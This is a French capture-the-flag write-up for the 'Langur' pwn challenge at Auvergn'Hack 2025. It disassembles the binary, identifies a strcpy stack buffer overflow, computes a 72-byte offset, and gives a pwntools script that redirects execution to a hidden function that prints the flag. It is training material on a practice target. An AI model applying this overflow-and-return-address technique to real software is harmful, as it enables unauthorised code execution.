---
title: "Auvergn'Hack 2025 : Langur | PWN "
date: 2025-04-06
draft: false
categories: ["Pwn"]
ctf: "Auvergn'Hack 2025"
challenge: "Langur"
author: "Reyko"
---

# WU Langur - PWN - Auvergn'Hack

Challenge :
Langur

Enoncé : 
Langur is often puzzled. Can you get him to talk ?
Additional info: No ASLR"

## 1. Objdump :

3 principales fonctions :

```asm
0000000000401240 <vulnerable_function>:
  401240:	55                   	push   %rbp
  401241:	48 89 e5             	mov    %rsp,%rbp
  401244:	48 83 ec 50          	sub    $0x50,%rsp
  401248:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
  40124c:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
  401250:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
  401254:	48 89 d6             	mov    %rdx,%rsi
  401257:	48 89 c7             	mov    %rax,%rdi
  40125a:	e8 d1 fd ff ff       	call   401030 <strcpy@plt>
  40125f:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
  401263:	48 89 c6             	mov    %rax,%rsi
  401266:	48 8d 05 07 0e 00 00 	lea    0xe07(%rip),%rax        # 402074 <_IO_stdin_used+0x74>
  40126d:	48 89 c7             	mov    %rax,%rdi
  401270:	b8 00 00 00 00       	mov    $0x0,%eax
  401275:	e8 e6 fd ff ff       	call   401060 <printf@plt>
  40127a:	90                   	nop
  40127b:	c9                   	leave
  40127c:	c3                   	ret

000000000040127d <main>:
  40127d:	55                   	push   %rbp
  40127e:	48 89 e5             	mov    %rsp,%rbp
  401281:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401285:	48 8d 05 f6 0d 00 00 	lea    0xdf6(%rip),%rax        # 402082 <_IO_stdin_used+0x82>
  40128c:	48 89 c7             	mov    %rax,%rdi
  40128f:	b8 00 00 00 00       	mov    $0x0,%eax
  401294:	e8 c7 fd ff ff       	call   401060 <printf@plt>
  401299:	48 8b 15 b0 2d 00 00 	mov    0x2db0(%rip),%rdx        # 404050 <stdin@GLIBC_2.2.5>
  4012a0:	48 8d 45 80          	lea    -0x80(%rbp),%rax
  4012a4:	be 80 00 00 00       	mov    $0x80,%esi
  4012a9:	48 89 c7             	mov    %rax,%rdi
  4012ac:	e8 bf fd ff ff       	call   401070 <fgets@plt>
  4012b1:	48 8d 45 80          	lea    -0x80(%rbp),%rax
  4012b5:	48 89 c7             	mov    %rax,%rdi
  4012b8:	e8 83 ff ff ff       	call   401240 <vulnerable_function>
  4012bd:	48 8d 05 d0 0d 00 00 	lea    0xdd0(%rip),%rax        # 402094 <_IO_stdin_used+0x94>
  4012c4:	48 89 c7             	mov    %rax,%rdi
  4012c7:	e8 74 fd ff ff       	call   401040 <puts@plt>
  4012cc:	b8 00 00 00 00       	mov    $0x0,%eax
  4012d1:	c9                   	leave
  4012d2:	c3                   	ret
  
  0000000000401196 <secret_function>:
  401196:	55                   	push   %rbp
  401197:	48 89 e5             	mov    %rsp,%rbp
  40119a:	48 81 ec 10 04 00 00 	sub    $0x410,%rsp
  4011a1:	48 8d 05 60 0e 00 00 	lea    0xe60(%rip),%rax        # 402008 <_IO_stdin_used+0x8>
  4011a8:	48 89 c6             	mov    %rax,%rsi
  4011ab:	48 8d 05 58 0e 00 00 	lea    0xe58(%rip),%rax        # 40200a <_IO_stdin_used+0xa>
  4011b2:	48 89 c7             	mov    %rax,%rdi
  4011b5:	e8 c6 fe ff ff       	call   401080 <fopen@plt>
  4011ba:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4011be:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
  4011c3:	75 19                	jne    4011de <secret_function+0x48>
  4011c5:	48 8d 05 49 0e 00 00 	lea    0xe49(%rip),%rax        # 402015 <_IO_stdin_used+0x15>
  4011cc:	48 89 c7             	mov    %rax,%rdi
  4011cf:	e8 bc fe ff ff       	call   401090 <perror@plt>
  4011d4:	bf 01 00 00 00       	mov    $0x1,%edi
  4011d9:	e8 c2 fe ff ff       	call   4010a0 <exit@plt>
  4011de:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  4011e2:	48 8d 85 f0 fb ff ff 	lea    -0x410(%rbp),%rax
  4011e9:	be 00 04 00 00       	mov    $0x400,%esi
  4011ee:	48 89 c7             	mov    %rax,%rdi
  4011f1:	e8 7a fe ff ff       	call   401070 <fgets@plt>
  4011f6:	48 85 c0             	test   %rax,%rax
  4011f9:	74 20                	je     40121b <secret_function+0x85>
  4011fb:	48 8d 85 f0 fb ff ff 	lea    -0x410(%rbp),%rax
  401202:	48 89 c6             	mov    %rax,%rsi
  401205:	48 8d 05 23 0e 00 00 	lea    0xe23(%rip),%rax        # 40202f <_IO_stdin_used+0x2f>
  40120c:	48 89 c7             	mov    %rax,%rdi
  40120f:	b8 00 00 00 00       	mov    $0x0,%eax
  401214:	e8 47 fe ff ff       	call   401060 <printf@plt>
  401219:	eb 0f                	jmp    40122a <secret_function+0x94>
  40121b:	48 8d 05 2e 0e 00 00 	lea    0xe2e(%rip),%rax        # 402050 <_IO_stdin_used+0x50>
  401222:	48 89 c7             	mov    %rax,%rdi
  401225:	e8 16 fe ff ff       	call   401040 <puts@plt>
  40122a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40122e:	48 89 c7             	mov    %rax,%rdi
  401231:	e8 1a fe ff ff       	call   401050 <fclose@plt>
  401236:	bf 00 00 00 00       	mov    $0x0,%edi
  40123b:	e8 60 fe ff ff       	call   4010a0 <exit@plt>
```

### 2.1 Fonction vulnérable

La fonction `vulnerable_function` copie l’entrée utilisateur (fonction main) sans vérifier la taille :

```asm
0000000000401240 <vulnerable_function>:
  401240:       55                      push   %rbp
  401241:       48 89 e5                mov    %rsp,%rbp
  401244:       48 83 ec 50             sub    $0x50,%rsp       
  401248:       48 89 7d b8             mov    %rdi,-0x48(%rbp)  ; Sauvegarde l'argument
  40124c:       48 8b 55 b8             mov    -0x48(%rbp),%rdx
  401250:       48 8d 45 c0             lea    -0x40(%rbp),%rax  ; Adresse du tampon local (64 octets)
  401254:       48 89 d6                mov    %rdx,%rsi
  401257:       48 89 c7                mov    %rax,%rdi
  40125a:       e8 d1 fd ff ff          call   401030 <strcpy@plt>  ; Appel à strcpy
```

**Explication :**
- Le tampon est alloué à partir de `-0x40(%rbp)`, donc 64 octets.
- Copie l’argument (`rdi` initialement) dans ce tampon avec `strcpy`, sans aucune vérification de la taille.
- Donc bufferoverflow possible.

### 2.2 Fonction secret

La fonction `secret_function` affiche le contenu de secret.txt :

```asm
0000000000401196 <secret_function>:
  401196:       55                      push   %rbp
  401197:       48 89 e5                mov    %rsp,%rbp
  40119a:       48 81 ec 10 04 00 00    sub    $0x410,%rsp      ; Réserve de l'espace pour les opérations
  ...
  4011fb:       48 8d 85 f0 fb ff ff    lea    -0x410(%rbp),%rax
  401202:       48 89 c6                mov    %rax,%rsi
  401205:       48 8d 05 23 0e 00 00    lea    0xe23(%rip),%rax   ; Prépare le format
  40120c:       48 89 c7                mov    %rax,%rdi
  40120f:       b8 00 00 00 00          mov    $0x0,%eax
  401214:       e8 47 fe ff ff          call   401060 <printf@plt> ; affiche
```

**Explication :**
- La fonction ouvre secret.txt et affiche le flag
- Elle n’est pas appelée par le flux "normale" du binaire.
- Objectif : rediriger le flux d’exécution pour que la fonction `secret_function` soit appelée.



## 3. Calcul de l’Offset et Exploitation

### 3.1 Calcul de l’Offset

Dans `vulnerable_function`, le tampon est de 64 octets.
Pour atteindre l’adresse de return, il faut écraser le saved base pointer de 8 octets.
Donc Offset total = 64 + 8 = 72 octets

### 3.2 Construction du Payload

L’idée est d’envoyer :
- 72 octets de padding (A*72)
- Puis l’adresse de `secret_function` (0x401196) en little-endian.



## 4. Script Pwntool

```python
#!/usr/bin/env python3
from pwn import *

# Chargement du binaire
elf = ELF('./langur')

# Lancement du binaire en local
p = process(elf.path)

# Offset calculé : 64 octets de tampon + 8 octets pour le saved rbp
offset = 72

# Adresse de la fonction secret_function
secret_function_addr = 0x401196

# Construction du payload : padding + adresse de secret_function
payload = b"A" * offset + p64(secret_function_addr)

# Envoi du payload au binaire
p.sendline(payload)

# Passage en mode interactif pour observer le résultat
p.interactive()
```

Pour cause de problème d'infra, le challenge n'a pas pu être testé en remote.
